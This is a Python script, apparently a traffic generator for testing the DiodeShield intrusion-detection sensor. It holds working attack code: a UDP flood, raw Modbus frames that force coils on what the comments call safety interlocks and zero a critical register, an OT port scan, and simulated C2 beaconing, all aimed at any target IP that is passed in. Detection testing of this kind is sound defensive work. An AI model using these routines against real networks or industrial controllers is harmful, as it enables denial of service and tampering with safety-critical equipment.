"""DiodeShield Multi-Laptop Remote Network Attack & Stress Testing Tool.

Use this script on ANOTHER laptop (or locally) to send real network traffic and
flooding attacks across the Wi-Fi / Ethernet LAN to the DiodeShield defense sensor.

Examples:
  # 1. High-speed UDP Flood Attack against DiodeShield laptop:
  python scripts/remote_attack_tool.py --target 10.168.1.249 --attack udp_flood --count 500 --rate 250

  # 2. Modbus OT ICS Exploit injection:
  python scripts/remote_attack_tool.py --target 10.168.1.249 --attack modbus_exploit --count 50

  # 3. Network Reconnaissance & Port Scan:
  python scripts/remote_attack_tool.py --target 10.168.1.249 --attack recon_scan

  # 4. Covert C2 Beaconing Simulation:
  python scripts/remote_attack_tool.py --target 10.168.1.249 --attack c2_beacon --count 20 --interval 0.5
"""
from __future__ import annotations

import argparse
import socket
import sys
import time
from datetime import datetime


def banner(target: str, attack: str, count: int, port: int) -> None:
    print("=" * 66)
    print("  DIODESHIELD REMOTE THREAT LAB: Real Network Traffic Generator")
    print("=" * 66)
    print(f"  Target IP:        {target}")
    print(f"  Target Port:      {port}")
    print(f"  Attack Scenario:  {attack.upper()}")
    print(f"  Total Packets:    {count}")
    print(f"  Timestamp:        {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 66)


def run_udp_flood(target: str, port: int, count: int, rate: int, payload_size: int = 256) -> None:
    """Send high-speed UDP flood burst to test volumetric detection."""
    banner(target, "UDP Flood (Volumetric Denial-of-Service)", count, port)
    delay = 1.0 / max(1, rate)
    payload = b"DIODESHIELD_FLOOD_PAYLOAD_TEST_" + b"A" * max(0, payload_size - 31)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    start_time = time.perf_counter()

    print(f"\n[+] Initiating UDP flood burst towards {target}:{port} at ~{rate} pkts/sec...")

    try:
        for i in range(1, count + 1):
            sock.sendto(payload, (target, port))
            sent += 1
            if i % 50 == 0 or i == count:
                elapsed = time.perf_counter() - start_time
                actual_rate = sent / max(0.001, elapsed)
                sys.stdout.write(f"\r  -> Sent: {sent}/{count} packets | Rate: {actual_rate:.1f} pkts/s")
                sys.stdout.flush()
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[!] Flood interrupted by user.")
    except Exception as e:
        print(f"\n[!] Socket error: {e}")
    finally:
        sock.close()

    total_time = time.perf_counter() - start_time
    print(f"\n\n[✔] Attack Completed: {sent} packets transmitted in {total_time:.2f}s.")
    print(f"[i] Check your DiodeShield SOC Dashboard (http://{target}:8000/dashboard/) for live CRITICAL alert!")


def run_modbus_exploit(target: str, port: int, count: int) -> None:
    """Inject illegal/unauthorized Modbus ICS function codes."""
    banner(target, "Modbus ICS Exploit (Protocol Anomaly / Unauthorized Command)", count, port)
    malicious_payloads = [
        # Force Multiple Coils (FC 15) targeting safety interlocks
        b"\x00\x01\x00\x00\x00\x08\x01\x0f\x00\x00\x00\x04\x01\xff",
        # Write Single Register (FC 06) setting critical threshold to 0
        b"\x00\x02\x00\x00\x00\x06\x01\x06\x00\x64\x00\x00",
        # Illegal Function Code 0x7E (Firmware Dump Attempt)
        b"\x00\x03\x00\x00\x00\x05\x01\x7e\x00\x01\x00",
        # Restart Communications Option (FC 08 Sub 0001)
        b"\x00\x04\x00\x00\x00\x06\x01\x08\x00\x01\xff\x00",
    ]

    sent = 0
    print(f"\n[+] Transmitting {count} Modbus exploit vectors towards {target}:{port}...")

    for i in range(count):
        payload = malicious_payloads[i % len(malicious_payloads)]
        # Try UDP first, then TCP
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(payload, (target, port))
                sent += 1
        except Exception:
            pass

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ts:
                ts.settimeout(0.2)
                ts.connect((target, port if port != 19001 else 1502))
                ts.sendall(payload)
                sent += 1
        except Exception:
            pass

        sys.stdout.write(f"\r  -> Injected exploit command #{i+1}/{count}")
        sys.stdout.flush()
        time.sleep(0.05)

    print(f"\n\n[✔] Injected {count} exploit frames. Modbus protocol anomaly trigger sent.")


def run_recon_scan(target: str) -> None:
    """Sweep common OT and IT ports to trigger port scan / reconnaissance alert."""
    ports = [502, 1502, 19001, 8080, 8000, 44818, 20000, 2404, 9999]
    banner(target, "Reconnaissance / Network Port Scan", len(ports), 0)
    print(f"\n[+] Sweeping {len(ports)} target ports on {target}...")

    detected_open = []
    for p in ports:
        # Probe UDP
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(b"\x00\x00\x00\x00_PROBE", (target, p))
        except Exception:
            pass

        # Probe TCP
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ts:
                ts.settimeout(0.3)
                res = ts.connect_ex((target, p))
                if res == 0:
                    detected_open.append(p)
        except Exception:
            pass

        print(f"  -> Scanned port {p}")
        time.sleep(0.08)

    print(f"\n[✔] Recon sweep finished. Responding ports: {detected_open}")
    print("[i] DiodeShield should flag high fan-out & reconnaissance behavior.")


def run_c2_beacon(target: str, port: int, count: int, interval: float) -> None:
    """Simulate steady periodic malware command-and-control beaconing."""
    banner(target, "C2 Malware Beaconing (Periodic Exfiltration)", count, port)
    print(f"\n[+] Transmitting periodic C2 beacons every {interval}s...")

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        for i in range(1, count + 1):
            beacon_data = f"C2_HEARTBEAT_SEQ_{i:04d}_SESSION_0xDEADBEEF".encode()
            s.sendto(beacon_data, (target, port))
            print(f"  [{datetime.now().strftime('%H:%M:%S')}] Beacon #{i}/{count} sent to {target}:{port}")
            time.sleep(interval)

    print(f"\n[✔] Completed {count} beacon transmissions.")


def main():
    parser = argparse.ArgumentParser(
        description="DiodeShield Multi-Laptop Remote Network Attack & Stress Testing Tool"
    )
    parser.add_argument("-t", "--target", default="127.0.0.1",
                        help="Target IP address of the laptop running DiodeShield (e.g. 10.168.1.249)")
    parser.add_argument("-p", "--port", type=int, default=19001,
                        help="Target port (default: 19001 for UDP flood, 502/1502 for Modbus)")
    parser.add_argument("-a", "--attack",
                        choices=["udp_flood", "modbus_exploit", "recon_scan", "c2_beacon"],
                        default="udp_flood",
                        help="Attack type to execute")
    parser.add_argument("-c", "--count", type=int, default=300,
                        help="Number of attack packets to generate (default: 300)")
    parser.add_argument("-r", "--rate", type=int, default=200,
                        help="Packet transmission rate in pkts/sec (default: 200)")
    parser.add_argument("-i", "--interval", type=float, default=0.5,
                        help="Beacon interval in seconds for c2_beacon (default: 0.5)")

    args = parser.parse_args()

    if args.attack == "udp_flood":
        run_udp_flood(args.target, args.port, args.count, args.rate)
    elif args.attack == "modbus_exploit":
        run_modbus_exploit(args.target, args.port, args.count)
    elif args.attack == "recon_scan":
        run_recon_scan(args.target)
    elif args.attack == "c2_beacon":
        run_c2_beacon(args.target, args.port, args.count, args.interval)


if __name__ == "__main__":
    main()
